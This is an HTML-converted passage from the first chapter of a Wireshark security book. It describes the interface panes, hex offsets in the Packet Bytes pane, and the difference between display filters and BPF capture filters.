</span><span><a href="#_bookmark21" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 1-1</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >because we are not yet capturing or don&#8217;t have a capture completed. As you go through this chapter, pay attention to this area to understand how it changes and how it reflects the various capture states. In many respects, Wireshark has an intuitive user experience.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.9000pt;margin-right:11.1500pt;" ><a name="_bookmark22" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The Filter toolbar, which is below the Main toolbar, is a vital part of the Wireshark UI. You will soon fall in love with this little box, as you often find yourself drowning in a torrent of traffic. The Filter toolbar lets you remove whatever is uninteresting to the task at hand and presents just what you&#8217;re looking for (or takes out what you&#8217;re not</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section23" ><p class=MsoBodyText  style="margin-top:3.9000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >looking for). You can enter display filters in the Filter text box that help you drill down what packets you see in the Packet List pane. We discuss filters in detail later in this chapter, but for now just trust me: They will be your new best friends.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:14.9500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Packet List Pane</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The largest portion in the middle of the interface is reserved for the packet list. This list shows all the packets captured along with useful information, such as source and destination IP, and the time difference between when the packets were received. Wireshark supports color coding various packets to make sorting of traffic and troubleshooting easier. You can add custom colors for packets of interest, and the columns within the Packet List pane display useful information such as the protocol, packet length, and other protocol- specific information (see<a name="_bookmark23" ></a>&nbsp;</span><span><a href="#_bookmark24" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 1-2</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="779"  height="556"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker34962.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:6.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:9.5000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark24" ></a><span><a href="#_bookmark23" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 1-2:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >The Packet List pane</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section24" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:9.0500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This window is the bird&#8217;s-eye view into the network you are sniffing or the packet capture you have loaded into Wireshark. The last column, by default <a name="_bookmark25" ></a>labeled &#8220;Info,&#8221; offers a quick summary of what that packet contains. Of course, it depends on the packet, but it might be the URL for an HTTP request or the contents of a DNS query, which is really useful for getting a quick handle on important traffic in your capture.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.1500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Packet Details Pane</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:10.4000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Below the Packet List pane is the Packet Details pane. The Packet Details pane shows information for the selected packet in the Packet List pane. This pane contains a ton of information, down to what the various bytes are within the packet. Information such as the source and destination MAC address is included here. The next row contains IP information. The next row reveals the packet is sending to UDP port 58351. The next row reveals what information is contained in</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >that UDP</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >packet.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:8.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >These rows are ordered by the headers as they are ordered when sending data on the network. That means they are subject to change if you are capturing on a different type of network, such as a wireless network, that has different headers. The DNS column, which is the application data encapsulated within UDP, is expanded in<a name="_bookmark26" ></a>&nbsp;</span><span><a href="#_bookmark27" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 1-3</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Notice how Wireshark allows you to easily pull out information, such as the actual DNS query that was made within this DNS packet. This is what makes Wireshark the powerful network analysis tool that it is.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You don&#8217;t have to memorize the DNS protocol to know which bits and bytes at what offset translate into a DNS query.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section25" ><p class=MsoBodyText ><img width="779"  height="554"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker36651.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark27" ></a><span><a href="#_bookmark26" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 1-3:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >The Packet Details pane</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Subtrees</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:6.3500pt;" ><a name="_bookmark28" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Because the details would be overwhelming if shown all at once, the information is organized and collapsed into sections. The sections, called </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >subtrees</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, can be collapsed and expanded to display only what you need. (In </span><span><a href="#_bookmark24" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 1-2</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, the subtrees are collapsed; in </span><span><a href="#_bookmark27" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 1-3</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, they are expanded.)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="258"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker37085.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.0000pt;" ><o:p>&nbsp;</o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section26" ><p class=MsoBodyText  style="margin-left:13.2500pt;" ><span><span style="position:absolute;z-index:1;margin-left:0.0000px;margin-top:0.0000px;width:763.0000px;height:82.0000px;" ><img width="763"  height="82"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker37113.png" ></span></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:5.2500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >If you&#8217;re already familiar with how a data frame is structured, you recognize how the packet details subtrees are divided. Details are structured into subtrees along the lines of the data frame&#8217;s headers. You can collapse/expand a subtree by clicking the arrow sign next to the relevant section. The arrow is pointing to the right if the subtree is collapsed. Once you click on the arrow to expand that subtree, you&#8217;ll see the arrow points down (refer to </span><span><a href="#_bookmark27" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 1-3</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >). And, of course, you&#8217;ll always have the option to expand or collapse all subtrees by right- clicking anywhere in the Packet Details pane to launch its pop-up menu.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In </span><span><a href="#_bookmark24" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figures 1-2</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and </span><span><a href="#_bookmark27" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >1-3</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, packet number 7 is selected. Whatever packet is selected in the Packet List pane is the packet presented in the panes below it. In this case, it&#8217;s packet number 7 showing within the Packet Details pane.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="223"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker38068.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:5.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >If you double-click this packet, a separate window appears, to open the packet details. This is useful when you want to visually compare two different packets quickly. The Packet Details area in </span><span><a href="#_bookmark27" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 1-3</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >shows various rows of information that can be expanded or collapsed.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.8000pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Capturing Enough Detail</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:9.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The first row contains metadata regarding the packet, such as the number of the packet, when it was captured, on what interface it was captured, and the number of bytes captured versus the number of bytes that were on the wire. That last part might sound a little strange.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section27" ><p class=MsoBodyText  style="margin-top:3.5000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Wouldn&#8217;t you always capture all the bytes that go across the wire? Not necessarily. Some network capture tools allow you to capture only a subset of the bytes that are actually transmitted across the wire. This is useful if you only want to get an idea of the type of packets that are going across the wire but not what actual data those packets <a name="_bookmark29" ></a>have, which can greatly reduce the size of the packet capture. The downside, of course, is that you get only a limited amount of information. If disk space is not an issue, feel free to capture it all. Just be mindful that you are capturing and storing all traffic traversing that network cable, which can quickly become a significant amount.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:8.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >There are ways to limit the size of the capture. For example, instead of truncated packet data, capture only specific packet types and not all traffic. If someone wants to send you a capture, or if you want to see specific traffic, you can have Wireshark capture only the traffic you want, saving space. Everything is done using the right filters&#8212;and that section is coming soon enough!</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.1500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Packet Bytes Pane</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.9000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >What follows the Packet Details pane is the Packet Bytes pane. This pane is at the bottom of the screen and wins the award for least intuitive. At first glance, it simply looks like gibberish. Bear with me for a couple of paragraphs; it will all make sense soon.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.8000pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Offsets, Hex, and ASCII</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:8.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You can see the Packet Bytes pane is divided into three columns. The first, left-most column simply counts incrementally: 0000, 0010, 0020, and so on. That&#8217;s the offset (in hexadecimal) of the selected packet. Here, </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >offset </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >simply means the number of bits off from the beginning&#8212;again, counting in hexadecimal (where 0x0010 = 16 in decimal). The middle column shows information, in hexadecimal, at that offset. The right-hand column shows the same information, but in ASCII. For example, the total amount of information from the very beginning (offset 0000) to offset 0010 is 16 bytes. The middle column shows each of the 16 bytes in hex. The right-hand column shows each of the 16 bytes in ASCII characters. When a hexadecimal value doesn&#8217;t translate to a printable ASCII character, only a &#8220;.&#8221; (period), is shown.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section28" ><p class=MsoBodyText  style="margin-top:3.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >So the Packet Bytes pane is actually the raw packet data as seen by Wireshark. By default, it is displayed in hex bytes.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Right-clicking the pane gives you the option to convert the hex bytes into bits, which is the purest representation of the data, though often this might not be as intuitive as the hex representation. Another neat feature is that any row you highlight within the Packet Details pane causes the corresponding data within the Packet Bytes pane to be highlighted. This can be helpful when troubleshooting Wireshark&#8217;s dissection, as it allows you to see exactly which packet bytes the dissector is looking at.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="Filters" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="_bookmark30" ></a>Filters</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:9.1000pt;" ><a name="_bookmark31" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >When you start your first packet capture, a lot will probably be going on in the Packet List pane. The packets move across the screen too fast to make sense of anything meaningful. Fortunately, this is where filters can help. Filters are the best way to quickly drill down to the information that matters most during your analysis sessions. The filtering engine in Wireshark allows you to narrow down the packets</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >in the packet list so that communication flows or certain activity by network devices becomes immediately</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.3500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >apparent.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:7.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Wireshark supports two kinds of filters: </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >display filters </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >capture filters</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Display filter are concerned only with what you see in the packet list; capture filters operate on the capture and drop packets that do not match the rules supplied. Note that the syntax of the two types of filters is not the same.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Capture filters use a low-level syntax called the </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >Berkeley Packet Filter </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(BPF), whereas display filters use a logic syntax you will recognize from most popular programming languages. Three other packet- capturing tools&#8212;TShark, Dumpcap, and tcpdump&#8212;also use BPF for capture filtering, as it&#8217;s quick and efficient. TShark and Dumpcap are both command-line packet-capturing tools and provide analysis capabilities, the former being the command-line counterpart to Wireshark. TShark, covered more deeply with example output, is introduced in </span><span><a href="#_bookmark237" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 4</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. The third, tcpdump, is strictly a packet- capturing tool.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section29" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:11.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Generally, you use capture filters when you want to limit the amount of network data that goes into processing and is getting saved; you use display filters to drill down into only the packets you want to analyze once the data has been processed.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.1000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Capture Filters</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:10.3000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >There are times when capturing network traffic that you can limit the traffic you want beforehand; at other times you will have to because the capture files will grow too large too fast if you don&#8217;t start filtering. Wireshark allows you to filter traffic in the capture phase. This is somewhat similar to the display filters, which you will read about later in this chapter, but there are fewer fields that can be used to filter on, and the syntax is different. It&#8217;s most important to understand that a capture filter screens packets before they are captured. A display filter, however, screens what saved packets are displayed. Therefore, a restrictive capture filter means your capture file will be small (and thus a smaller number of displayed packets, too). But using no</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >capture filter means <a name="_bookmark32" ></a>capturing every packet, and thus a large capture file, on which display filters can be used to narrow the list of packets</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.7000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >shown.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.9500pt;margin-right:10.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >While it makes sense for Wireshark to capture everything by default, it does actually use default capture filters in some scenarios. If you are using Wireshark on a remote session, such as through Remote Desktop or through SSH, then capturing every packet would include many packets relaying the session traffic. Upon startup, Wireshark checks to see whether a remote session is in use. If so, a capture filter to filter out remote session traffic is in use by default.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  align=justify  style="margin-top:7.7500pt;margin-right:19.1500pt;text-align:justify;text-justify:inter-ideograph;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The building blocks of a capture filter are the </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >protocol</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >direction</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >,</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.2500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >type</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. For example, </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >tcp dst port 22</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.8500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >captures only TCP packets with a destination port of 22. The possible types</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.5000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >are:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  align=justify  style="margin-top:11.6000pt;margin-right:424.6000pt;margin-left:30.5000pt;text-indent:0.0000pt;text-align:justify;text-justify:inter-ideograph;line-height:181%;" ><span style="position:absolute;z-index:1;left:0px;margin-left:133.0833px;margin-top:24.0833px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker44831.png" ></span><span style="position:absolute;z-index:1;left:0px;margin-left:133.0833px;margin-top:65.3333px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker44832.png" ></span><span style="position:absolute;z-index:1;left:0px;margin-left:133.0833px;margin-top:106.5833px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker44833.png" ></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:181%;font-size:12.0000pt;" >host port net</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:181%;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  align=justify  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:30.5000pt;text-indent:0.0000pt;text-align:justify;text-justify:inter-ideograph;" ><span style="position:absolute;z-index:1;left:0px;margin-left:133.0833px;margin-top:4.7500px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for 